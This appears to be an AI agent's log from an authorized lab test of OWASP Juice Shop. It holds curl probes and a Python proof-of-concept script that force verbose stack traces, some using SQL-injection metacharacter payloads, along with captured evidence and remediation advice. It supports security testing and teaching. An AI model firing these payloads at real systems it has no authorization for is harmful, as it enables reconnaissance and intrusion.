data.targets: http://host.docker.internal:3000 (OWASP Juice Shop, my own lab)
data.goal: Make the application disclose an internal error/stack trace or error detail an attacker shouldn't see. Save the evidence (the error text + what caused it) to /workspace/evidence/c6_error.txt

args.command: curl -s -o /dev/null -w "Feedbacks: %{http_code} " -X POST http://host.docker.internal:3000/api/Feedbacks -H 'Content-Type: application/json' --data-binary '{}'; curl -s -X POST http://host.docker.internal:3000/api/Feedbacks -H 'Content-Type: application/json' --data-binary '{}' | grep -o '<title>[^<]*</title>\|at /juice-shop/build/routes/captcha.js[^<]*'; echo; curl -s -o /dev/null -w "dataerasure: %{http_code} " -X POST http://host.docker.internal:3000/dataerasure -H 'Content-Type: application/json' --data-binary '{}'; curl -s -X POST http://host.docker.internal:3000/dataerasure -H 'Content-Type: application/json' --data-binary '{}' | grep -o '<title>[^<]*</title>\|at /juice-shop/build/routes/dataErasure.js[^<]*'; echo; curl -s "http://host.docker.internal:3000/rest/products/search?q=apple%27" | grep -o '<title>[^<]*</title>'

args.content:
#!/usr/bin/env python3 """ C06 - Information Disclosure via verbose internal error / stack trace Target: http://host.docker.internal:3000 (OWASP Juice Shop, authorized lab) Root cause: the app runs with Express' *default* error handler (NODE_ENV != production), so any unhandled exception is serialised straight back to the client as HTML: * exception class + message ->

500 SyntaxError: ...

* framework version banner ->

OWASP Juice Shop (Express ^4.22.1)

* full Node.js stack trace ->
    ... at /juice-shop/build/...
Five independent unauthenticated triggers are exercised. Every one leaks internal detail (absolute container paths, module layout, ORM/DB engine strings, internal IPs). Run: python3 pocs/c6_error_disclosure_v2.py Out: /workspace/evidence/c6_error.txt (evidence: error text + cause) /workspace/evidence/c6_error_raw_responses.txt (full HTTP transcripts) Exit: 0 if >= 2 vectors leaked a stack trace, else 1 """ import re import sys import urllib.error import urllib.request BASE = "http://host.docker.internal:3000" # (id, method, path, body, content-type, human description of the trigger) VECTORS = [ ("1", "POST", "/rest/user/login", b'{"email":', "application/json", "Malformed JSON body: truncated object (body-parser JSON.parse throws)"), ("2", "GET", "/rest/products/search?q=%27--", None, None, "SQL metacharacters in the search term break the generated SQLite query"), ("3", "GET", "/rest/products/search?q=apple%27", None, None, "Single quote in search term -> unterminated SQL string literal"), ("4", "POST", "/api/Feedbacks", b'{}', "application/json", "Empty object: required ORM field (captchaId) resolves to undefined"), ("5", "POST", "/dataerasure", b'{}', "application/json", "Empty object hits the data-erasure route's internal guard, which throws " "with the caller's IP address embedded in the message"), ] TITLE_RE = re.compile(r"(.*?)", re.S) BANNER_RE = re.compile(r"

(.*?)

", re.S) H2_RE = re.compile(r"

(.*?)

", re.S) FRAMES_RE = re.compile(r"
  • (.*?)
    • ", re.S) def unesc(s): return (s.replace("<", "<").replace(">", ">") .replace(""", '"').replace("'", "'").replace("&", "&")) def send(method, path, body, ctype): req = urllib.request.Request(BASE + path, data=body, method=method) req.add_header("User-Agent", "c06-error-poc/1.0") if ctype: req.add_header("Content-Type", ctype) try: with urllib.request.urlopen(req, timeout=15) as r: return r.status, dict(r.headers), r.read().decode("utf-8", "replace") except urllib.error.HTTPError as e: return e.code, dict(e.headers), e.read().decode("utf-8", "replace") def analyse(text): frames = [unesc(f).strip() for f in FRAMES_RE.findall(text)] frames = [f for f in frames if f] return { "title": unesc(TITLE_RE.search(text).group(1).strip()) if TITLE_RE.search(text) else "", "banner": unesc(BANNER_RE.search(text).group(1).strip()) if BANNER_RE.search(text) else "", "headline": unesc(H2_RE.search(text).group(1).strip()) if H2_RE.search(text) else "", "frames": frames, "has_stack": bool(frames) or "id=\"stacktrace\"" in text, "paths": sorted(set(re.findall(r"(/juice-shop/[A-Za-z0-9_./-]+)", text))), } def main(): raw, ev = [], [] hits = 0 for vid, method, path, body, ctype, why in VECTORS: status, headers, text = send(method, path, body, ctype) info = analyse(text) leaked = status == 500 and (info["has_stack"] or info["title"]) raw.append("=" * 78) raw.append(f"[VECTOR {vid}] {method} {BASE}{path}") raw.append(f"CAUSE : {why}") if body: raw.append(f"BODY : {body.decode()}") raw.append(f"REQ HEADERS : Content-Type: {ctype or '(none)'}") raw.append(f"RESP STATUS : HTTP {status}") for h in ("Content-Type", "X-Content-Type-Options", "X-Frame-Options"): if h in headers: raw.append(f"RESP HEADER : {h}: {headers[h]}") raw.append("-" * 78) raw.append(text.rstrip()) raw.append("") ev.append("-" * 78) ev.append(f"[{vid}] {method} {BASE}{path}") if body: ev.append(f" cause : {why}") ev.append(f" payload : {body.decode()}") else: ev.append(f" cause : {why}") ev.append(f" result : HTTP {status}") if info["banner"]: ev.append(f" banner : {info['banner']}") if info["headline"]: ev.append(f" error : {info['headline']}") elif info["title"]: ev.append(f" error : {info['title']}") if info["frames"]: for f in info["frames"]: ev.append(f" frame : {f}") if info["paths"]: ev.append(f" leaked paths: {', '.join(info['paths'])}") ev.append(f" STACK TRACE DISCLOSED: {'YES' if leaked else 'no'}") ev.append("") if leaked: hits += 1 print(f"[{vid}] HTTP {status} leak={'YES' if leaked else 'no'} " f"{(info['headline'] or info['title'])[:90]}") summary = (f"{hits}/{len(VECTORS)} unauthenticated requests returned HTTP 500 with " f"an internal error rendered by Express' default error handler " f"(exception text + absolute /juice-shop paths + stack trace).") print("\n" + summary) with open("/workspace/evidence/c6_error.txt", "w", encoding="utf-8") as f: f.write("C06 - INTERNAL ERROR / STACK TRACE DISCLOSURE\n") f.write("Target : " + BASE + " (OWASP Juice Shop 20.3.0, authorized lab)\n") f.write("Class : CWE-209 Generation of Error Message Containing Sensitive " "Information / CWE-200\n") f.write("Root cause: Express is running with its default (non-production) error " "handler, which reflects err.stack and err.message to the client.\n") f.write("PoC : pocs/c6_error_disclosure_v2.py\n") f.write("Summary : " + summary + "\n\n") f.write("Every trigger below is unauthenticated. The leaked stack traces expose\n") f.write("absolute container paths (/juice-shop/build/...), the Express version,\n") f.write("Sequelize/ORM internals, raw SQLite engine errors and internal source\n") f.write("IPs (::ffff:172.17.0.1). No credentials required.\n\n") f.write("=" * 78 + "\n") f.write("DISCLOSED ERROR TEXT + CAUSE\n") f.write("=" * 78 + "\n\n") f.write("\n".join(ev)) f.write("\n" + "=" * 78 + "\n") f.write("REMEDIATION\n") f.write("=" * 78 + "\n") f.write("- Run with NODE_ENV=production so Express uses the generic error handler.\n") f.write("- Never send err.stack/ORM/DB messages to clients; log server-side only.\n") f.write("- Add centralised error middleware returning a generic message + trace id.\n") f.write("- Reject malformed JSON with 400 (body-parser error handling), not 500.\n") f.write("- Parameterise/validate all query input; never surface SQLITE_ERROR text.\n") with open("/workspace/evidence/c6_error_raw_responses.txt", "w", encoding="utf-8") as f: f.write("\n".join(raw)) print("Evidence written to /workspace/evidence/c6_error.txt") print("Raw transcripts -> /workspace/evidence/c6_error_raw_responses.txt") return 0 if hits >= 2 else 1 if __name__ == "__main__": sys.exit(main())

args.command: cd /workspace && wc -l evidence/c6_error.txt evidence/c6_error_raw_responses.txt && echo "-----" && sed -n '1,40p' evidence/c6_error.txt

cd /workspace && python3 - <<'EOF' import re p='pocs/c6_error_disclosure_v2.py' s=open(p).read() s=s.replace('''def unesc(s): return (s.replace("<", "<").replace(">", ">") .replace(""", '"').replace("'", "'").replace("&", "&"))''', '''def unesc(s): s = (s.replace(" ", " ").replace("<", "<").replace(">", ">") .replace(""", '"').replace("'", "'").replace("&", "&")) s = re.sub(r"^\\d+\\s*", "", s.strip()) return re.sub(r"\\s+", " ", s)''') open(p,'w').write(s) EOF python3 pocs/c6_error_disclosure_v2.py >/dev/null; echo "EXIT=$?"; sed -n '14,32p;96,112p' evidence/c6_error.txt

cd /workspace && grep -nE "^\[[0-9]\]|    error   :|STACK TRACE DISCLOSED" evidence/c6_error.txt && echo "--- sizes ---" && ls -l evidence/c6_error.txt evidence/c6_error_raw_responses.txt pocs/c6_error_disclosure_v2.py

args.summary:
GOAL MET: made OWASP Juice Shop (http://host.docker.internal:3000, v20.3.0) disclose internal error detail / stack traces to an unauthenticated client, and saved the evidence.

ROOT CAUSE
The app runs with Express' default (non-production) error handler, so any unhandled exception is serialised straight back to the client as HTML containing:
- the exception class + message,
- the framework banner "OWASP Juice Shop (Express ^4.22.1)",
- the full Node.js stack trace with absolute container paths (/juice-shop/build/..., /juice-shop/node_modules/...).
Missing/undersized error handling means no generic 500, no logging-only path.

TRIGGERS (5/5 confirmed, all HTTP 500, no auth)
1. POST /rest/user/login body `{"email":` -> SyntaxError: Unexpected end of JSON input + 15 frames incl. /juice-shop/build/server.js:357:33 (body-parser JSON.parse).
2. GET /rest/products/search?q=%27-- -> SQLITE_ERROR: incomplete input (raw DB engine message from Sequelize).
3. GET /rest/products/search?q=apple%27 -> SQLITE_ERROR: near "'%'": syntax error (error-based SQLi oracle).
4. POST /api/Feedbacks `{}` -> "WHERE parameter \"captchaId\" has invalid \"undefined\" value" (Sequelize ORM validation internals).
5. POST /dataerasure `{}` -> "Blocked illegal activity by ::ffff:172.17.0.1" + frames at /juice-shop/build/routes/dataErasure.js:104:18 — leaks an internal source IP and server-side control-flow detail.

IMPACT
Absolute filesystem paths + module layout (path traversal/LFI/source review recon), framework & ORM versions (CVE targeting), raw SQLite strings (error-based SQLi iteration, ties to the earlier UNION dump), internal IP/source network mapping.

ARTIFACTS
- pocs/c6_error_disclosure_v2.py — PoC, run with `python3 pocs/c6_error_disclosure_v2.py` (exit 0, 5/5 leaked).
- /workspace/evidence/c6_error.txt — REQUIRED deliverable: per-vector cause, request, payload, HTTP status, banner, error text, every stack frame, leaked paths, "STACK TRACE DISCLOSED: YES", plus remediation.
- /workspace/evidence/c6_error_raw_responses.txt — full raw HTTP transcripts + unmodified HTML error pages.
- evidence/c6_error_writeup.md — pre-existing analysis, now backed by reproducible live evidence.

REASONING PATH
Verified target/version -> tested candidate triggers individually with curl (all returned 500 with <title> exception text) -> consolidated into one deterministic PoC -> normalised HTML entities for readable frames -> confirmed 5/5 lines and all vectors present in the evidence file.

NOTE: earlier workspace contents (c10, kdbx/FTP artifacts, crypto material) predate this session and were not used or modified. No destructive actions taken.
